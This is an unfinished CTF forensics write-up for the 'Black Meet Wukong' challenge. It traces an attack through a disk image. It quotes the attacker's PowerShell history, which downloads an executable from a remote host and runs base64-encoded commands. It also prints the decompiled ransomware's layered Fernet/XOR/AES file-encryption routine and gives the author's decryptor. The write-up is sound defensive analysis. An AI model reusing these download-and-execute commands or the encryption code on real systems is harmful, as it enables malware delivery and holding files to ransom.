# [ WriteUp/Notes ] Black Meet Wukong (unsolved)  | Forensic - World Wide CTF 2024 

## By: Haaloobim as [HCS](https://ctftime.org/team/70159)

## Description 
1. Scenario: 
Our system was attacked by a mysterious attacker. Could you help me recover the system and trace their footprint? (Flag has 2 parts!)<br />

2. Tools :
- [FTK Imager](https://accessdata-ftk-imager.software.informer.com/3.1/)

## How to solve? 

- We got an .ad1 file, and from this we will analyze it in FTK Imager. 

![](./src/ftk.png)

- From now on, i started to analyze the file, because the desc mentioned about mysterious attacker, im trying too look up the foothold of these atacker. After search/analyze it, i found out that the attacker use powershell to download the malware as it found in this path `\[root]\Users\wukong\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` 

here is the part of the powershell script that has been run. 

```ps1
...
Invoke-WebRequest http://192.168.56.104:8000/bLAcKmEeTWUkOng.exe -OutFile C:\Users\wukong\AppData\Local\
Invoke-WebRequest http://192.168.56.102:8000/bLAcKmEeTWUkOng.exe -OutFile C:\Users\wukong\AppData\Local\
Invoke-WebRequest http://192.168.56.102:8000/bLAcKmEeTWUkOng.exe -OutFile C:\Users\wukong\AppData\Local\blackmythwukong.exe
...
powershell -e 'U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFxVc2Vyc1x3dWtvbmdcQXBwRGF0YVxMb2NhbFxibGFjS21lZVRXVmtPbmdfZXhlIg=='
$base64Command = 'U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFxVc2Vyc1x3dWtvbmdcQXBwRGF0YVxMb2NhbFxibGFjS21lZVRXVmtPbmdfZXhlIg=='  # Replace this string with your actual Base64 command`
$bytes = [Convert]::FromBase64String($base64Command)`
$command = [System.Text.Encoding]::Unicode.GetString($bytes)`
powershell Invoke-Expression $command`

ls
clear
powershell -e 'U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFxVc2Vyc1xcd3Vrb25nXFxBcHBEYXRhXFxMb2NhbFxcYkxBY0ttRWVUV1VrT25nLmV4ZSI=='
clear
$base64Command = 'U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFxVc2Vyc1x3dWtvbmdcQXBwRGF0YVxMb2NhbFxibGFjS21lZVRXVmtPbmdfZXhlIg==' 
$bytes = [Convert]::FromBase64String($base64Command)
$command = [System.Text.Encoding]::Unicode.GetString($bytes)
Invoke-Expression $command
...
powershell -e 'UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzAFwAdwB1AGsAbwBuAGcAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAYgBMAEEAYwBLAG0ARQBlAFQAVwBVAGsATwBuAGcALgBlAHgAZQA='
```

As we know, that the malware installed in this path `[root]\Users\wukong\AppData\Roaming\Microsoft\Windows\` 

After we dump the malware, now i know that the malware have python based application. And also i decompile the application use this online tool, [pyinsaller extarctor](https://pyinstxtractor-web.netlify.app/) and this [pyc decompiler](https://pylingual.io/) and here is the python malware script -> [script](./src/scriptWukongMalware.py)

Based on the analysis from the malware script, we found out that the malware script encrypt between theese directories:

```
'C:\\Users\\{}\\Documents'.format(PC_username)
'C:\\Users\\{}\\Pictures'.format(PC_username)
'C:\\Users\\{}\\Desktop'.format(PC_username)
'C:\\Users\\{}\\Downloads'.format(PC_username)
```

and using theese encryptor:

```py
key_fernet = [b'zTskoYGm68VrSiOM6J9W0PqyKTfSyraM0NydVmJvM_k=', b'pcD23bRQTL1MqLS84NdPsiPdYJlwbTaal6JmulzTq4k=', b'9EBQNDjmy0rGXCbVgVnrgFFsAHk4Ye1M8y1GSIx9CPY=', b'663RnK5l0MQzewfpAQfYhJbL3p7ZRoR-j7I3DkXiUIk=', b'I5Arxkgfo2E56VBVctFjJ-pFkeBbQg6QXMuG-gNgqq4=', b'eXP1sKfkTE9PNkWR8rA9jzJqun80yMYPrzMMi65JQpw=', b'56S9Sv7zUPL71w6N2OTSwxvFl_a-5zvsN6rxQI97UWU=', b'gZcRMaVftMg_F9E4tNQ_etAR7_PKT_vVfWwWkMSxDQc=', b'-XmaKL4uo4p0gM5ARQZtxjZ_5ecK1w53AEkWuiWDIzQ=', b'ikNfBtrrX-9EBI3iKzWnBJW5wNNvi8rM4oT9BLqDJNw=', b'uEikHaHAX1B20aB_bcQwUA0aO21Ai-rgYAqGfKxHKJA=', b'deoHTwNvwTOuQjoy5oh9jN_ZQlLbVCvwI47D3sQt8UA=', b'xuaD7BqwreniKZAvBO38MO250oO40HXboxhU8--6YQ0=', b'X5GfY_zukIDPKxyzmMYFkps-Av8Ao2TQDPmckrjb3ZQ=', b'CAOD7XSW4e-ON33uz5_8h6RZhorDlKg798e1RcEYSlo=', b'dMphwlwO6Qh_FCdbMzseoZsWkQWPFtGx8VSiFAN2SSo=', b'q4NfcRieLIKnyBwFEhUxZcR_8A3BFS_n_cIE8sFX8a4=', b'hLfAPR06xuo545qJlzlYko5f9KKuXOBrCBNgzruTV14=']
key_xori = 'y0u_l00k_l1k3_X1sh1_&_b3_my_l4dy'

def god_bless_aes(data, key):
    key = key.encode('utf-8')
    cipher = AES.new(key, AES.MODE_ECB)
    padded_text = pad(data, AES.block_size)
    cipher_text = cipher.encrypt(padded_text)
    return cipher_text

def xoriiiiiiiiiii(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

def crypter_fichier(file_path, output_path):
    with open(file_path, 'rb') as file:
        original_data = file.read()
    encrypted_data = original_data
    for key in key_fernet:
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(encrypted_data)
    encrypted_data = xoriiiiiiiiiii(encrypted_data, key_fernet[0])
    final = god_bless_aes(encrypted_data, key_xori)
    with open(output_path, 'wb') as enc_file:
        enc_file.write(final)
```

and here is my decryptor for the the encrypt system. 

```py
from Crypto.Util.Padding import unpad
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet

key_fernet = [b'zTskoYGm68VrSiOM6J9W0PqyKTfSyraM0NydVmJvM_k=', b'pcD23bRQTL1MqLS84NdPsiPdYJlwbTaal6JmulzTq4k=', b'9EBQNDjmy0rGXCbVgVnrgFFsAHk4Ye1M8y1GSIx9CPY=', b'663RnK5l0MQzewfpAQfYhJbL3p7ZRoR-j7I3DkXiUIk=', b'I5Arxkgfo2E56VBVctFjJ-pFkeBbQg6QXMuG-gNgqq4=', b'eXP1sKfkTE9PNkWR8rA9jzJqun80yMYPrzMMi65JQpw=', b'56S9Sv7zUPL71w6N2OTSwxvFl_a-5zvsN6rxQI97UWU=', b'gZcRMaVftMg_F9E4tNQ_etAR7_PKT_vVfWwWkMSxDQc=', b'-XmaKL4uo4p0gM5ARQZtxjZ_5ecK1w53AEkWuiWDIzQ=', b'ikNfBtrrX-9EBI3iKzWnBJW5wNNvi8rM4oT9BLqDJNw=', b'uEikHaHAX1B20aB_bcQwUA0aO21Ai-rgYAqGfKxHKJA=', b'deoHTwNvwTOuQjoy5oh9jN_ZQlLbVCvwI47D3sQt8UA=', b'xuaD7BqwreniKZAvBO38MO250oO40HXboxhU8--6YQ0=', b'X5GfY_zukIDPKxyzmMYFkps-Av8Ao2TQDPmckrjb3ZQ=', b'CAOD7XSW4e-ON33uz5_8h6RZhorDlKg798e1RcEYSlo=', b'dMphwlwO6Qh_FCdbMzseoZsWkQWPFtGx8VSiFAN2SSo=', b'q4NfcRieLIKnyBwFEhUxZcR_8A3BFS_n_cIE8sFX8a4=', b'hLfAPR06xuo545qJlzlYko5f9KKuXOBrCBNgzruTV14=']
key_xori = 'y0u_l00k_l1k3_X1sh1_&_b3_my_l4dy'

def god_bless_aes_decrypt(data, key):
    key = key.encode('utf-8')
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(data) + decryptor.finalize()
    
    unpadded_data = unpad(decrypted_data, algorithms.AES.block_size // 8)
    return unpadded_data

def xor_decrypt(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

def decrypter_fichier(input_path, output_path):
    with open(input_path, 'rb') as enc_file:
        encrypted_data = enc_file.read()
    
    aes_decrypted = god_bless_aes_decrypt(encrypted_data, key_xori)
    
    xor_decrypted = xor_decrypt(aes_decrypted, key_fernet[0])
    decrypted_data = bytes(xor_decrypted)
    for key in reversed(key_fernet):
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(decrypted_data)
    
    with open(output_path, 'wb') as file:
        file.write(decrypted_data)

import os
target_path = 'Documents'
decrypt_path = 'Decrypted'
## os walks in target_path
for root, dirs, files in os.walk(target_path):
    for file in files:
        if file.endswith('.odin'):
            input_path = os.path.join(root, file)
            output_path = os.path.join(decrypt_path, file.replace('.odin', ''))
            decrypter_fichier(input_path, output_path)


```

after doing the decryption found one image that show us the first flag 

![](./src/wukong.png)

TBC..